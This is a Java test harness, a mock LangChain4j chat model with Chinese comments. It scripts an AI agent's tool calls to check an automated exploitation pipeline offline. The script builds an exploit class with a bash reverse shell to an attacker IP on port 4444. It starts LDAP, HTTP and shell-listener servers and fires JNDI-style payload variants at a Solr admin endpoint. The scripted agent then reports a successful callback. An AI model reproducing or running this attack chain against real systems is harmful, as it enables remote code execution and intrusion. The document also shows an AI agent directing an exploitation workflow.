package agent;

import com.fasterxml.jackson.databind.ObjectMapper;
import dev.langchain4j.agent.tool.ToolExecutionRequest;
import dev.langchain4j.data.message.AiMessage;
import dev.langchain4j.model.chat.ChatModel;
import dev.langchain4j.model.chat.request.ChatRequest;
import dev.langchain4j.model.chat.response.ChatResponse;
import dev.langchain4j.model.output.FinishReason;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Mock 模型：没有真实 LLM 也能完整跑通 Agent 循环（用于离线自检）。
 *
 * 原理：Mock 把决策写死成一个脚本（按顺序来行动），但工具执行、返回结果、循环走的全是 AiServices 的真实代码。 
 *  Mock 验证的是"LLM选了之后整条链路能不能通"，并不是"怎么选择 "。
 *
 */
public class MockChatModel implements ChatModel {

    private static final ObjectMapper JSON = new ObjectMapper();

    /** 一个回合返回一次响应 */
    public interface Step {
        ChatResponse respond();
    }

    private final List<Step> steps = new ArrayList<>();
    private int pointer = 0;

    /** 记录每个回合收到的消息 */
    public final List<ChatRequest> received = new ArrayList<>();

    /** 离线测试环境（target 127.0.0.1:targetPort） */
    public static MockChatModel standardScript(String attackerIp, int targetPort) {
        MockChatModel m = new MockChatModel();
        m.toolCall("generateExploitClass",
                Map.of("command", "bash -i >& /dev/tcp/" + attackerIp + "/4444 0>&1"));
        m.toolCall("startLdapServer", Map.of("port", 1389));
        m.toolCall("startHttpServer", Map.of("port", 8888));
        m.toolCall("startShellListener", Map.of("port", 4444, "waitMs", 6000));
        m.toolCall("listPayloadVariants", Map.of());
        m.toolCall("tryPayloadVariant", Map.of(
                "host", "127.0.0.1",
                "port", targetPort,
                "path", "/solr/admin/cores",
                "variantId", "v02",
                "timeoutMs", 3000));
        m.toolCall("getCallbackStats", Map.of());
        m.finalAnswer("任务完成：v02（合法 DN）变体命中，LDAP 回调已建立，链路验证通过。");
        return m;
    }

    /** 核心实现：doChat 是 ChatModel 的扩展点 */
    @Override
    public ChatResponse doChat(ChatRequest request) {
        received.add(request);
        if (pointer >= steps.size()) {
            return ChatResponse.builder()
                    .aiMessage(new AiMessage("(mock script exhausted, no more steps)"))
                    .finishReason(FinishReason.STOP)
                    .build();
        }
        return steps.get(pointer++).respond();
    }

    private void toolCall(String name, Map<String, Object> args) {
        String arguments;
        try {
            arguments = JSON.writeValueAsString(args);   // 与真实 LLM 相同的 JSON 参数格式
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        steps.add(() -> {
            ToolExecutionRequest req = ToolExecutionRequest.builder()
                    .id("mock_call_" + pointer)
                    .name(name)
                    .arguments(arguments)
                    .build();
            return ChatResponse.builder()
                    .aiMessage(new AiMessage(List.of(req)))
                    .finishReason(FinishReason.TOOL_EXECUTION)
                    .build();
        });
    }

    private void finalAnswer(String text) {
        steps.add(() -> ChatResponse.builder()
                .aiMessage(new AiMessage(text))
                .finishReason(FinishReason.STOP)
                .build());
    }
    
    public static String jsonArgs(Map<String, Object> args) {
        try {
            return JSON.writeValueAsString(args);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static Map<String, Object> mapOf(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) {
            m.put((String) kv[i], kv[i + 1]);
        }
        return m;
    }
}
